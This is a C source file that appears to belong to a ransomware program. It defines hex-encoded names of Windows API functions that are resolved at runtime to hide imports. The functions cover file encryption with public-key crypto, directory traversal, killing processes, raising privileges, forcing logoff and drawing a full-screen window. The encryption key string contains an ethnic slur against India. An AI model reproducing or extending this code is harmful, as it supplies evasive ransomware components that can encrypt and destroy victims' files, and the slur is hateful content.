#define KEY "FUCKINDIA"
#include "khalsa_g.h"
#define NTDLL L"ntdll.dll"
#define LENGTH 0

HANDLE hNTDLL = NULL;
HANDLE hAdvapi32 = NULL;
HANDLE hGDI = NULL;
HANDLE hKernel32 = NULL;
HANDLE hCrypt32 = NULL;
HANDLE hUser32 = NULL;
enum _DllName {
	ADVAPI32_DLL,
	CRYPT32_DLL,
	KERNEL32_DLL,
	USER32_DLL,
	NTDLL_DLL,
	GDI_DLL,
} DllName;

typedef struct _ENCRYPTED_DLL {
	SIZE_T stDll;
	LPCWSTR Dll;
	SIZE_T DllType;
	HANDLE hDll;
} ENCRYPTED_DLL, * PENCRYPTED_DLL;

typedef struct _ENCRYPTED_STRINGS {
	LPCWSTR lpszEncryptedString;
	LPWSTR lpszDest;
} ENCRYPTED_STRINGS, * PENCRYPTED_STRINGS;


typedef struct _ENCRYPTED_STRINGS_API {
	SIZE_T stLENGTH;
	LPCSTR STRING;
	LPVOID lpFunc;

	SIZE_T Type;
} ENCRYPTED_STRINGS_API, * PENCRYPTED_STRINGS_API;

ENCRYPTED_STRINGS EncryptedStrings[] = {
	{ NULL, 0 }
};

ENCRYPTED_STRINGS_API EncryptedStringApi[] = {
	{ 41, "16BB17527F60532D3A50E95148F98C6ECED5A008", &_CryptAcquireContextW, ADVAPI32_DLL},
	{ 39, "16BB17527F7355302A58E85148F98C6ECED5A0", &_CryptReleaseContext, ADVAPI32_DLL},
	{ 29, "1BBD2D506E404439024CEF5565E2", &_NtCreateMutant, NTDLL_DLL},
	{ 57, "07BD02666452603D3B51D55566F3B675E5D9843EA9D28101BC20A202", &_RtlDosPathNameToNtPathName_U, NTDLL_DLL},
	{ 25, "1BBD2D506E4044390950F751", &_NtCreateFile, NTDLL_DLL},
	{ 17, "1DAC0F524D535539", &_HeapFree, KERNEL32_DLL},
	{ 29, "12AC1A72794E53393C4AD3516AE6", &_GetProcessHeap, KERNEL32_DLL},
	{ 15, "1BBD2D4E645255", &_NtClose, NTDLL_DLL},
	{ 49, "1BBD3F576E53490F364AEF5166DF8C7CC4DFB93EA9D3A00E", &_NtQuerySystemInformation, NTDLL_DLL},
	{ 27, "1BBD21526E4F602E205AFE4778", &_NtOpenProcess, NTDLL_DLL},
	{ 37, "1BBD3A47794C59322E4DFE6479F9817FD8DE", &_NtTerminateProcess, NTDLL_DLL},
	{ 41, "16BB17527F72442E2657FC6064D48B74CADFAD08", &_CryptStringToBinaryW, CRYPT32_DLL},
	{ 39, "16BB17527F65553F205DFE7B69FC8779DFE8AC", &_CryptDecodeObjectEx, CRYPT32_DLL},
	{ 49, "16BB17527F685D2C204BEF647EF48E73C8E6B12694D4A90F", &_CryptImportPublicKeyInfo, CRYPT32_DLL},
	{ 19, "19A60D43676742392A", &_LocalFree, KERNEL32_DLL},
	{ 25, "16BB17527F645E3F3D40EB40", &_CryptEncrypt, ADVAPI32_DLL},
	{ 29, "16BB17527F64482C204BEF7F6EEF", &_CryptExportKey, ADVAPI32_DLL},
	{ 23, "16BB17527F665532045CE2", &_CryptGenKey, ADVAPI32_DLL},
	{ 31, "16BB17527F65552F3B4BF44D40F39B", &_CryptDestroyKey, ADVAPI32_DLL},
	{ 45, "1BBD3F576E534915215FF44666F79673C4C39236B1DF", &_NtQueryInformationFile, NTDLL_DLL},
	{ 41, "1BBD3D477F685E3A204BF6557FFF8D74EDC4B83A", &_NtSetInformationFile, NTDLL_DLL},
	{ 59, "07BD0267735151322B7CF54262E48D74C6C8BA2B8ECEBD09BF228E08F7", &_RtlExpandEnvironmentStrings_U, NTDLL_DLL},
	{ 49, "07BD02656E5573293D4BFE5A7FD28B68CECEA030AFC39035", &_RtlGetCurrentDirectory_U, NTDLL_DLL},
	{ 21, "1BBD21526E4F7635235C", &_NtOpenFile, NTDLL_DLL},
	{ 41, "1BBD3F576E534918264BFE577FF99063EDC4B83A", &_NtQueryDirectoryFile, NTDLL_DLL},
	{ 51, "1BBD3F576E534915215FF44666F79673C4C3842DB2D9AA13A2", &_NtQueryInformationProcess, NTDLL_DLL},
	{ 23, "1BBD2D506E404439045CE2", &_NtCreateKey, NTDLL_DLL},
	{ 27, "1BBD3D477F7751303A5CD05172", &_NtSetValueKey, NTDLL_DLL},
	{ 43, "1BBD3943625576333D6AF25A6CFA8755C9C7B13CA9", &_NtWaitForSingleObject, NTDLL_DLL},
	{ 19, "1DAC0F524A4D5C332C", &_HeapAlloc, KERNEL32_DLL},
	{ 21, "1BBD3C476A457635235C", &_NtReadFile, NTDLL_DLL},
	{ 37, "1BBD284E7E52581E3A5FFD5179E5A473C7C8", &_NtFlushBuffersFile, NTDLL_DLL},
	{ 35, "06B01D566E4C7629215AEF5D64F8D2299D", &_RtlGenRandom, ADVAPI32_DLL},
	{ 23, "1BBD39506255551A2655FE", &_NtWriteFile, NTDLL_DLL},
	{ 23, "18AC1D516A46551E2041CC", &_MessageBoxW, USER32_DLL},
	{ 73, "07BD02666452603D3B51D55566F3B675F9C8B83EA9D3B9059F31AD36D66B77AF7181874F", &_RtlDosPathNameToRelativeNtPathName_U, NTDLL_DLL},
	{ 37, "07BD026D7B445E1F3A4BE95165E2B769CEDF", &_RtlOpenCurrentUser, NTDLL_DLL},

	{ 45, "07BD0261794451282A6CF55D68F9867FF8D9A636B3DD", &_RtlCreateUnicodeString, NTDLL_DLL},
	{ 41, "07BD0264794455092150F85B6FF3B16ED9C4BA38", &_RtlFreeUnicodeString, NTDLL_DLL},
	{ 39, "07BD0261794451282A6CE85179C28A68CECCB0", &_RtlCreateUserThread, NTDLL_DLL},
	{ 49, "1BBD3943625576333D74EE587FFF9276CEE2B635B8D9BB13", &_NtWaitForMultipleObjects, NTDLL_DLL},
	{ 33, "1BBD2A4767404919375CF8417FFF8D74", &_NtDelayExecution, NTDLL_DLL},
	{ 37, "1BBD21526E4F602E205AFE4778C28D71CEC3", &_NtOpenProcessToken, NTDLL_DLL},
	{ 47, "1BBD2F46615443281F4BF24262FA877DCEDE8030B6DFA1", &_NtAdjustPrivilegesToken, NTDLL_DLL},


	{ 41, "19A601497E51602E264FF2586EF1874CCAC1A13A", &_LookupPrivilegeValueW, ADVAPI32_DLL},
	{ 27, "10B107565C485E38204EE87173", &_ExitWindowsEx, USER32_DLL},
	{ 25, "06AC1A766E59441F2055F446", &_SetTextColor, GDI_DLL},

	{ 21, "06AC1A6060625F30204B", &_SetBkColor, GDI_DLL},

	{ 25, "12AC1A6E6A5244193D4BF446", &_GetLastError, KERNEL32_DLL},
	{ 19, "22BA1E50624F443A18", &_wsprintfW, USER32_DLL},
	{ 23, "16BB0B437F447633214DCC", &_CreateFontW, GDI_DLL},
	{ 11, "12AC1A6648", &_GetDC, USER32_DLL},
	{ 43, "12AC1A766E594419374DFE5A7FC68D73C5D9E76D8A", &_GetTextExtentPoint32W, GDI_DLL},
	{ 21, "18A618475C485E38204E", &_MoveWindow, USER32_DLL},
	{ 25, "06AC00464644432F2E5EFE63", &_SendMessageW, USER32_DLL},
	{ 29, "11AC0875624F54333869E95B68C1", &_DefWindowProcW, USER32_DLL},
	{ 31, "05A61D565A545928025CE8476AF187", &_PostQuitMessage, USER32_DLL},
	{ 25, "11AC02477F447F3E255CF840", &_DeleteObject, GDI_DLL},
	{ 33, "01BB0F4C784D51282A74FE4778F7857F", &_TranslateMessage, USER32_DLL},
	{ 33, "11A01D526A555334025CE8476AF1874D", &_DispatchMessageW, USER32_DLL},

	{ 23, "12AC1A6F6E52433D285CCC", &_GetMessageW, USER32_DLL},
	{ 21, "06A101555C485E38204E", &_ShowWindow, USER32_DLL},
	{ 31, "16BB0B437F446735215DF4434EEEB5", &_CreateWindowExW, USER32_DLL},



	{ 33, "12AC1A666E525B282049CC5D65F28D6D", &_GetDesktopWindow, USER32_DLL},
	{ 27, "12AC1A75624F5433386BFE577F", &_GetWindowRect, USER32_DLL},
	{ 33, "07AC094B7855552E0C55FA4778D39A4D", &_RegisterClassExW, USER32_DLL},

	{ 33, "16BB0B437F4463332350FF7679E39172", &_CreateSolidBrush, GDI_DLL},
	{ 33, "16BB0B437F4463332350FF7679E39172", &_CreateSolidBrush, GDI_DLL},
	{ 0, NULL, NULL, 0}
};

CHAR LDRLOADDLL[21] = "19AD1C6E644054182355";
CHAR LDRUNLOADDLL[25] = "19AD1C77654D5F3D2B7DF758";
CHAR RTLINITANSISTRING[35] = "07BD026B6548441D214AF2677FE48B74CC";
CHAR RLTINITUNICODESTRING[41] = "07BD026B654844092150F85B6FF3B16ED9C4BA38";
CHAR LDRGETPROCEDUREADDRESS[45] = "19AD1C656E55602E205AFE507EE4875BCFC9A63AAEC9";
CHAR LDRGETDLLHANDLE[31] = "19AD1C656E5574302371FA5A6FFA87";

ENCRYPTED_DLL EncryptedStringDll[] = {
	{ LENGTH, L"advapi32.dll", ADVAPI32_DLL, &hAdvapi32},

	{ LENGTH, L"crypt32.dll", CRYPT32_DLL, &hCrypt32},
	{ LENGTH, L"kernel32.dll", KERNEL32_DLL, &hKernel32},
	{ LENGTH, L"user32.dll", USER32_DLL, &hUser32},
	{ LENGTH, L"ntdll.dll", NTDLL_DLL, &hNTDLL},
	{ LENGTH, L"gdi32.dll", GDI_DLL, &hGDI},
	{ 0, NULL, 0, NULL}
};
